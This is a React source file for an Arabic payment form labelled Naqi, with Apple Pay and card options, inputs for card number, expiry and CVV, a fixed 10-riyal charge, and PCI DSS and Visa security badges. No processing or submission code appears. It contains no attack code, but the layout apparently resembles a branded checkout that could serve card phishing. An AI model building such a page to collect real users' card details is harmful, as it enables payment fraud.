import { useState } from "react";
import { Input } from "@/components/ui/input";

export default function NaqiCardForm() {
  const [cardType, setCardType] = useState("cards"); // "apple" | "cards"

  return (
    <div className="border border-border rounded-xl overflow-hidden bg-white" dir="rtl">
      {/* Header */}
      <div className="flex items-center justify-between px-5 py-4 border-b border-border bg-white">
        <img
          src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/d4fe35008_image.png"
          alt="Naqi"
          className="h-10 w-auto object-contain"
        />
      </div>

      {/* Payment type selector */}
      <div className="px-5 pt-4 pb-3">
        <p className="text-sm text-center text-foreground mb-3 font-medium">اختر طريقتك في الدفع</p>
        <div className="flex gap-3">
          {/* Apple Pay */}
          <button
            type="button"
            onClick={() => setCardType("apple")}
            className={`flex-1 flex items-center justify-center gap-2 py-3 rounded-lg border-2 transition-all ${
              cardType === "apple" ? "border-primary bg-primary/5" : "border-border"
            }`}
          >
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 165.521 128.561" className="h-5 w-auto">
              <path d="M150.698 0H14.823C6.632 0 0 6.632 0 14.823v98.915c0 8.191 6.632 14.823 14.823 14.823h135.875c8.191 0 14.823-6.632 14.823-14.823V14.823C165.521 6.632 158.889 0 150.698 0z" fill="#000"/>
              <path d="M60.232 45.533c-1.916 2.278-4.993 4.057-8.07 3.807-.384-3.077 1.124-6.349 2.878-8.37 1.916-2.342 5.28-4.024 8.007-4.15.321 3.205-0.937 6.346-2.815 8.713zm2.782 4.409c-4.457-.257-8.25 2.529-10.376 2.529-2.142 0-5.4-2.4-8.942-2.336-4.601.065-8.876 2.671-11.22 6.814-4.793 8.286-1.252 20.567 3.413 27.317 2.28 3.333 5.013 7.01 8.618 6.878 3.413-.129 4.729-2.207 8.877-2.207 4.13 0 5.319 2.207 8.942 2.143 3.733-.065 6.088-3.333 8.365-6.669 2.601-3.797 3.669-7.466 3.733-7.657-.065-.065-7.234-2.8-7.298-11.02-.065-6.878 5.608-10.147 5.866-10.34-3.219-4.73-8.19-5.26-9.978-5.452z" fill="#fff"/>
              <path d="M96.888 38.66v51.264h7.972V71.86h11.022c10.057 0 17.11-6.884 17.11-16.619 0-9.736-6.884-16.58-16.775-16.58H96.888zm7.972 6.718h9.176c6.884 0 10.819 3.685 10.819 10.21 0 6.524-3.935 10.25-10.861 10.25H104.86V45.378zm40.674 44.879c4.982 0 9.611-2.52 11.715-6.524h.164v6.151h7.384V65.086c0-7.423-5.94-12.197-15.083-12.197-8.483 0-14.75 4.858-14.983 11.507h7.175c.622-3.147 3.519-5.211 7.549-5.211 4.858 0 7.591 2.271 7.591 6.441v2.823l-9.943.581c-9.238.539-14.22 4.349-14.22 10.943 0 6.649 5.149 11.284 12.651 11.284zm2.148-6.275c-4.233 0-6.925-2.023-6.925-5.169 0-3.271 2.587-5.128 7.549-5.418l8.857-.539v2.898c0 4.692-3.975 8.228-9.481 8.228zm30.022 20.15c7.799 0 11.465-2.982 14.669-12.03l14.054-39.416h-8.152l-9.406 30.393h-.164l-9.406-30.393h-8.399l13.556 37.559-.727 2.271c-1.245 3.934-3.27 5.46-6.9 5.46-.64 0-1.9-.04-2.42-.12v6.152c.5.14 2.756.124 3.295.124z" fill="#fff"/>
            </svg>
          </button>

          {/* Visa / Mastercard / Mada */}
          <button
            type="button"
            onClick={() => setCardType("cards")}
            className={`flex-1 flex items-center justify-center gap-1.5 py-3 rounded-lg border-2 transition-all ${
              cardType === "cards" ? "border-primary bg-primary/5" : "border-border"
            }`}
          >
            {/* Mastercard */}
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 38 24" className="h-5 w-auto">
              <circle cx="15" cy="12" r="10" fill="#EB001B"/>
              <circle cx="23" cy="12" r="10" fill="#F79E1B"/>
              <path d="M19 5.929A10.003 10.003 0 0 1 22.071 12 10.003 10.003 0 0 1 19 18.071 10.003 10.003 0 0 1 15.929 12 10.003 10.003 0 0 1 19 5.929z" fill="#FF5F00"/>
            </svg>
            {/* Visa */}
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 750 471" className="h-4 w-auto">
              <path d="M278.2 334.7l35-207h56l-35 207h-56zM524.3 131.3c-11.1-4.2-28.5-8.7-50.2-8.7-55.3 0-94.3 28-94.6 68.2-.3 29.7 27.7 46.3 48.9 56.2 21.7 10.1 29 16.6 28.9 25.7-.1 13.9-17.3 20.2-33.3 20.2-22.3 0-34.1-3.1-52.4-10.7l-7.2-3.3-7.8 46c13 5.7 37 10.7 61.9 11 58.6 0 96.6-27.6 97-70.5.2-23.5-14.6-41.3-46.7-56-19.5-9.5-31.4-15.8-31.3-25.4 0-8.5 10.1-17.6 31.9-17.6 18.2-.3 31.4 3.7 41.7 7.8l5 2.3 7.6-45.2zM619.2 127.7H574c-13.8 0-24.1 3.8-30.1 17.7l-85.4 194.1h60.4l12-31.7h73.7l7 31.7h53.3l-46.7-211.8zm-70.9 135l22.7-58.7c-.3.5 4.7-12.2 7.6-20.1l3.8 18.1 13.2 60.7h-47.3zM232.8 127.7l-54.9 141.2-5.9-28.6c-10.2-33.2-42-69.3-77.5-87.4l50.1 181.8 59.2-.1 88.2-207h-59.2z" fill="#1a1f71"/>
              <path d="M131.3 127.7H43.1l-.7 4c69.6 17 115.7 58.1 134.8 107.5l-19.5-94.3c-3.4-13.3-13.3-16.8-26.4-17.2z" fill="#f9a533"/>
            </svg>
            {/* Mada */}
            <img src="https://media.base44.com/images/public/69f0f838e7b863b3ce41773c/d4fe35008_image.png" alt="mada" className="h-4 w-auto object-contain" />
          </button>
        </div>
      </div>

      {/* Card Fields */}
      {cardType === "cards" && (
        <div className="px-5 pb-5 space-y-3">
          <div>
            <label className="text-xs text-muted-foreground block mb-1 text-right">الاسم على البطاقة</label>
            <Input placeholder="الاسم الكامل" className="h-12 bg-white text-right" />
          </div>
          <div>
            <label className="text-xs text-muted-foreground block mb-1 text-right">بيانات البطاقة</label>
            <div className="border border-input rounded-md overflow-hidden bg-white">
              <div className="flex items-center px-3 py-3 border-b border-input gap-2">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5 text-muted-foreground shrink-0" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={1.5}>
                  <rect x="2" y="5" width="20" height="14" rx="2" ry="2"/>
                  <line x1="2" y1="10" x2="22" y2="10"/>
                </svg>
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="1234 1234 1234 1234"
                  maxLength={19}
                  required
                  className="flex-1 text-sm outline-none bg-transparent text-right"
                  onChange={e => {
                    let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                    v = v.replace(/(.{4})/g, "$1 ").trim();
                    e.target.value = v;
                  }}
                />
              </div>
              <div className="flex divide-x divide-x-reverse divide-input">
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="MM"
                  maxLength={2}
                  required
                  className="flex-1 px-3 py-3 text-sm outline-none bg-transparent text-center"
                />
                <input
                  type="text"
                  inputMode="numeric"
                  placeholder="YY"
                  maxLength={2}
                  required
                  className="flex-1 px-3 py-3 text-sm outline-none bg-transparent text-center"
                />
                <div className="flex-1 flex items-center px-3 gap-1">
                  <input
                    type="password"
                    placeholder="CVV"
                    maxLength={4}
                    required
                    className="flex-1 py-3 text-sm outline-none bg-transparent text-center w-0"
                  />
                  <span className="text-muted-foreground">
                    <svg xmlns="http://www.w3.org/2000/svg" className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                      <circle cx="12" cy="12" r="10"/>
                      <line x1="12" y1="8" x2="12" y2="12"/>
                      <line x1="12" y1="16" x2="12.01" y2="16"/>
                    </svg>
                  </span>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {cardType === "apple" && (
        <div className="px-5 pb-5 pt-2 text-center text-sm text-muted-foreground">
          <p>سيتم فتح Apple Pay عند الضغط على "تأكيد الطلب"</p>
        </div>
      )}

      {/* Amount + Security */}
      <div className="px-5 pb-4 space-y-4">
        <div className="bg-muted/50 rounded-lg px-4 py-3 flex items-center justify-end gap-2">
          <span className="text-xl font-black text-foreground">10.00</span>
          <span className="text-lg font-bold text-foreground">﷼</span>
          <span className="text-xs text-muted-foreground mr-auto">المبلغ المطلوب الآن</span>
        </div>

        {/* Security logos */}
        <div className="flex items-center justify-center gap-4 pt-1">
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/PCI_DSS_Logo.svg/220px-PCI_DSS_Logo.svg.png" alt="PCI DSS" className="h-7 w-auto object-contain grayscale opacity-70" />
          <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Mastercard_SecureCode_logo.svg/220px-Mastercard_SecureCode_logo.svg.png" alt="SecureCode" className="h-7 w-auto object-contain grayscale opacity-70" />
          <div className="flex items-center gap-1 text-xs text-muted-foreground font-medium border border-border rounded px-2 py-1">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-3 h-3" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}><path d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg>
            Verified by VISA
          </div>
        </div>
      </div>
    </div>
  );
}